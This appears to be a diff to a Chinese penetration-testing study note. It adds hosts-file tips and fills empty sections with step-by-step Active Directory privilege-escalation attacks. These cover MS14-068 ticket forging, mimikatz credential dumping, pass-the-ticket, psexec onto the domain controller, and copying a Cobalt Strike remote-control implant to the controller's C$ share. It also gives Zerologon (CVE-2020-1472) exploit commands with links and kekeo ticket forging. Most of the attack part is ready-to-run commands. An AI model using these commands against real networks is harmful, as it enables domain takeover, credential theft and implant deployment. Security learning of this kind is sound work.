@@ -13,6 +13,7 @@ tags:
     - 学习笔记
     - 权限提升
     - 漏洞利用
+    - 域渗透
 ---
 
 
@@ -56,6 +57,24 @@ python -m http.server 4444
 certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt c:\a.txt          # 下载链接中的robots.txt文件保存到c盘a.txt文件中  
 certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete            # 清理缓存
 ```
+
+#### 4. ip绑定域名
+
+- windows下
+
+```
+C:\Windows\System32\drivers\etc\hosts
+```
+
+记事本打开，在最后追加ip及对应域名即可。
+
+- Linux下
+
+```
+/etc/hosts
+```
+
+vim打开，在最后追加ip及对应域名即可。
 
 
 
@@ -759,15 +778,129 @@ nc.exe -vv -l -p 4444
 
 ## 0x0c ms14-068域内提权
 
-未完待续。
+#### 1. 相关工具
+
+- lazagne（获取windows hash的工具）
+- mimikatz（获取windows hash的工具）
+- adfind（域内扫描工具）
+- [ms14-068.exe](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068)（ms14-068漏洞利用工具）
+- psexec.exe（域内提权工具）
+
+#### 1. 获取当前域用户的sid
+
+漏洞利用需要获取到一个普通的域账户，包括账户名，密码或者hash。
+
+使用lazagne或者mimikatz可以抓取到域账户信息，需要将工具上传到目标主机上。
+
+通过域账户执行命令 
+
+```shell
+C:\Users\User>whoami /user
+
+用户信息
+----------------
+
+用户名              SID
+=================== =============================================
+houkc\user S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx
+```
+
+可以获取到当前域账户的sid。
+
+#### 2. 生成TGT票据
+
+使用 adfind获取域控的主机名字。
+
+使用mimikatz可以获取主机明文密码：
+
+```shell
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+```
+
+使用以下命令攻击域内主机：
+
+```shell
+ms14-068.exe -u [用户名]@[域名] -p [密码] -s [sid] -d [域控主机名].[域名]
+```
+
+注意-d后面只能跟正确的域控主机名.域名，而不能用ip
+
+```shell
+ms14-068.exe -u temp@houkc.com -p 123456 -s S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx -d AdServer.houkc.com
+```
+
+执行完成会生成票据文件`TGT_temp@houkc.com.ccache`
+
+#### 3. 导入票据
+
+可以先命令行输入以下命令来清空当前票据：
+
+```shell
+klist purge
+```
+
+使用mimikatz可以导入票据：
+
+```shell
+mimikatz.exe "kerberos::ptc TGT_temp@houkc.com.ccache" exit
+```
+
+导入完成输入以下命令查看当前导入票据：
+
+```shell
+klist
+```
+
+#### 4. psexec提权为域控的administrator账户
+
+```shell
+psexec.exe \\AdServer.houkc.com cmd
+```
+
+#### 5. 拷贝远控程序xxx.exe到根目录
+
+```shell
+copy ./xxx.exe \\AdServer.cleverbao.com\c$        # 拷贝到c盘
+# 或者
+copy ./xxx.exe \\AdServer.cleverbao.com\c$\users\    # 拷贝到c盘下的users目录
+```
+
+远控程序可以用cobaltstrike生成。
+
+
 
 ## 0x0d CVE-2020-1472
 
-未完待续。
+github上可以下载exp，也是域控提权
+
+```shell
+python exp.py houkc.com 10.10.30.30
+psexec.exe \\10.10.30.30 cmd
+```
+
+参考exp如：
+
+- [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
+- [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
+- [https://github.com/risksense/zerologon](https://github.com/risksense/zerologon)
+
+
 
 ## 0x0e kekeo 域内主机提权
 
-未完待续。
+kekeo工具功能类似ms14-068.exe
+
+下载链接：[https://github.com/gentilkiwi/kekeo](https://github.com/gentilkiwi/kekeo)
+
+- 生成票据功能
+
+```shell
+kekeo.exe "exploit::ms14068 /user:[账户名] /password:[密码] /sid:[sid] /ptc" exit
+# 例如：
+kekeo.exe "exploit::ms14068 /user:temp /password:123456 /sid:S-x-x-xx-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx /ptc" exit
+```
+
+其他功能同ms14-068.exe。
 
 
 
